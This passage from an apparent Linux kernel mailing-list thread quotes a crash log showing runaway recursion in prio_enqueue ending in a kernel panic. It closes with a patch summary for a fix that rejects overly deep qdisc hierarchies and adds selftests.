> [  192.467235][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467242][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467248][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467256][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467262][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467269][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467275][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467283][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467289][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467297][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467303][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467310][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467317][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467324][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467330][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467338][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467344][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467351][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467357][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467365][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467371][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467379][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467385][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467392][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467398][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467406][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467412][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467419][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467425][    C0]  ? __pfx_stack_trace_save+0x10/0x10
> [  192.467432][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467439][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467445][    C0]  ? vma_complete+0x9f4/0xf70
> [  192.467472][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467478][    C0]  ? __lock_acquire+0x49f/0x1a40
> [  192.467487][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467493][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467500][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467506][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467513][    C0]  ? __pfx_stack_trace_consume_entry+0x10/0x10
> [  192.467520][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467526][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467533][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467539][    C0]  ? stack_trace_save+0x8e/0xc0
> [  192.467545][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467551][    C0]  ? stack_depot_save_flags+0x27/0x9d0
> [  192.467577][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467583][    C0]  ? mas_wr_split+0x1c23/0x3960
> [  192.467613][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467619][    C0]  ? mprotect_fixup+0x27a/0xe30
> [  192.467629][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467635][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467642][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467648][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467655][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467661][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467668][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467675][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467680][    C0]  ? __lock_acquire+0x49f/0x1a40
> [  192.467688][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467695][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467702][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467708][    C0]  ? __pfx_stack_trace_consume_entry+0x10/0x10
> [  192.467715][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467721][    C0]  ? kernel_text_address+0x8d/0x100
> [  192.467738][    C0]  ? unwind_get_return_address+0x59/0xa0
> [  192.467753][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467760][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467767][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467774][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467781][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467787][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467795][    C0]  prio_enqueue+0x209/0x7c0
> [  192.467801][    C0]  ? __pfx_prio_enqueue+0x10/0x10
> [  192.467807][    C0]  ? __pfx_do_raw_spin_lock+0x10/0x10
> [  192.467816][    C0]  __dev_queue_xmit+0x2ffa/0x4970
> [  192.467840][    C0]  ? kmalloc_reserve+0x148/0x350
> [  192.467855][    C0]  ? __pfx___dev_queue_xmit+0x10/0x10
> [  192.467863][    C0]  ? lock_acquire+0x180/0x370
> [  192.467870][    C0]  ? find_held_lock+0x2b/0x80
> [  192.467875][    C0]  ? nf_hook.constprop.0+0x2f0/0x760
> [  192.467884][    C0]  ? nf_hook.constprop.0+0x2f0/0x760
> [  192.467894][    C0]  ? nf_hook.constprop.0+0x2fa/0x760
> [  192.467902][    C0]  ? __pfx_arp_xmit_finish+0x10/0x10
> [  192.467911][    C0]  ? __pfx_nf_hook.constprop.0+0x10/0x10
> [  192.467920][    C0]  ? lock_acquire+0x1b9/0x370
> [  192.467928][    C0]  arp_xmit+0x106/0x2e0
> [  192.467937][    C0]  arp_send_dst+0x200/0x280
> [  192.467945][    C0]  arp_solicit+0x672/0x1070
> [  192.467951][    C0]  ? trace_kmem_cache_alloc+0xdd/0x100
> [  192.467959][    C0]  ? __kasan_slab_alloc+0x89/0x90
> [  192.467966][    C0]  ? __pfx_arp_solicit+0x10/0x10
> [  192.467972][    C0]  ? neigh_probe+0x72/0x110
> [  192.467988][    C0]  ? __pfx_arp_solicit+0x10/0x10
> [  192.467993][    C0]  neigh_probe+0xce/0x110
> [  192.468001][    C0]  __neigh_event_send+0xabe/0x13d0
> [  192.468009][    C0]  neigh_resolve_output+0x550/0x8f0
> [  192.468015][    C0]  ? __pfx____neigh_create+0x10/0x10
> [  192.468022][    C0]  ip_finish_output2+0x851/0x2400
> [  192.468032][    C0]  ? __pfx_ip_finish_output2+0x10/0x10
> [  192.468039][    C0]  ? __pfx_ip_dst_mtu_maybe_forward+0x10/0x10
> [  192.468048][    C0]  ? find_held_lock+0x2b/0x80
> [  192.468053][    C0]  __ip_finish_output.part.0+0x444/0x6f0
> [  192.468062][    C0]  ip_output+0x39b/0xc10
> [  192.468070][    C0]  ? __pfx_ip_output+0x10/0x10
> [  192.468077][    C0]  ? __ip_make_skb+0x111e/0x1f90
> [  192.468086][    C0]  ? __pfx_ip_finish_output+0x10/0x10
> [  192.468094][    C0]  ? __pfx_ip_output+0x10/0x10
> [  192.468102][    C0]  ip_push_pending_frames+0x284/0x300
> [  192.468111][    C0]  raw_sendmsg+0x1509/0x3590
> [  192.468117][    C0]  ? __pfx_raw_sendmsg+0x10/0x10
> [  192.468123][    C0]  ? avc_has_perm+0x135/0x1e0
> [  192.468148][    C0]  ? __pfx_avc_has_perm+0x10/0x10
> [  192.468157][    C0]  ? __pfx_tomoyo_check_inet_address+0x10/0x10
> [  192.468177][    C0]  ? __pfx_raw_sendmsg+0x10/0x10
> [  192.468183][    C0]  inet_sendmsg+0x11c/0x140
> [  192.468192][    C0]  __sys_sendto+0x453/0x4e0
> [  192.468214][    C0]  ? __pfx_inet_sendmsg+0x10/0x10
> [  192.468223][    C0]  ? __pfx___sys_sendto+0x10/0x10
> [  192.468231][    C0]  ? count_memcg_events_mm.constprop.0+0xfa/0x2a0
> [  192.468241][    C0]  __x64_sys_sendto+0xe0/0x1c0
> [  192.468249][    C0]  ? do_syscall_64+0x90/0x860
> [  192.468257][    C0]  ? lockdep_hardirqs_on+0x78/0x100
> [  192.468266][    C0]  do_syscall_64+0x10b/0x860
> [  192.468275][    C0]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
> [  192.468281][    C0] RIP: 0033:0x7f69fe7cf046
> [  192.468295][    C0] Code: 0e 0d 00 f7 d8 64 89 02 48 c7 c0 ff ff ff ff=
 eb b8 0f 1f 00 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 11 b8 2c 00 00 00=
 0f 05 <48> 3d 00 f0 ff ff 77 72 c3 90 55 48 83 ec 30 44 89 4c 24 2c 4c 89
> [  192.468301][    C0] RSP: 002b:00007ffdb7ccbf98 EFLAGS: 00000246 ORIG_R=
AX: 000000000000002c
> [  192.468307][    C0] RAX: ffffffffffffffda RBX: 00007ffdb7ccd720 RCX: 0=
0007f69fe7cf046
> [  192.468311][    C0] RDX: 0000000000000040 RSI: 000055becbf95950 RDI: 0=
000000000000003
> [  192.468315][    C0] RBP: 000055becbf95950 R08: 00007ffdb7ccf99c R09: 0=
000000000000010
> [  192.468319][    C0] R10: 0000000000000000 R11: 0000000000000246 R12: 0=
000000000000040
> [  192.468322][    C0] R13: 00007ffdb7ccd6e0 R14: 00007ffdb7ccbfa0 R15: 0=
000001d00000001
> [  192.468338][    C0]  </TASK>
> [  192.468349][    C0] Modules linked in:
> [  192.468370][    C0] ---[ end trace 0000000000000000 ]---
> [  192.468381][    C0] RIP: 0010:prio_enqueue+0x2e/0x7c0
> [  192.468388][    C0] Code: 55 48 89 e5 41 57 41 56 41 55 49 bd 00 00 00=
 00 00 fc ff df 41 54 49 89 fc 53 48 89 f3 48 83 e4 f0 48 83 c4 80 4c 8d 74=
 24 20 <48> 89 54 24 18 48 c7 44 24 20 b3 8a b5 41 49 c1 ee 03 48 c7 44 24
> [  192.468394][    C0] RSP: 0018:ffffc9000dbd7fe0 EFLAGS: 00010283
> [  192.468399][    C0] RAX: ffffffff89a12450 RBX: ffff88804c17cc00 RCX: f=
fffffff89a1298d
> [  192.468410][    C0] RDX: ffffc9000dbdf380 RSI: ffff88804c17cc00 RDI: f=
fff88803c2ca580
> [  192.468414][    C0] RBP: ffffc9000dbd8090 R08: 0000000000000005 R09: 0=
00000000000ffff
> [  192.468418][    C0] R10: 0000000000000000 R11: 0000000000000001 R12: f=
fff88803c2ca580
> [  192.468422][    C0] R13: dffffc0000000000 R14: ffffc9000dbd8000 R15: f=
fff88804c179280
> [  192.468426][    C0] FS:  00007f69fe54f000(0000) GS:ffff8880d62af000(00=
00) knlGS:0000000000000000
> [  192.468437][    C0] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
> [  192.468442][    C0] CR2: ffffc9000dbd7fd8 CR3: 000000004b49e000 CR4: 0=
000000000352ef0
> [  192.468455][    C0] Kernel panic - not syncing: Fatal exception in int=
errupt
> [  192.469576][    C0] Kernel Offset: disabled
>
> -----END crash log-----
>
> Best regards,
> Zijie Huang
>
>
> Zijie Huang (2):
>   net/sched: reject overly deep qdisc hierarchies
>   selftests/tc-testing: add qdisc hierarchy depth tests
>
>  include/net/sch_generic.h                     |  1 +
>  net/sched/sch_api.c                           |  9 +++
>  .../tc-testing/tc-tests/qdiscs/depth.json     | 74 +++++++++++++++++++
>  3 files changed, 84 insertions(+)
>  create mode 100644 tools/testing/selftests/tc-testing/tc-tests/qdiscs/de=
pth.json
>
> --
> 2.47.2
>
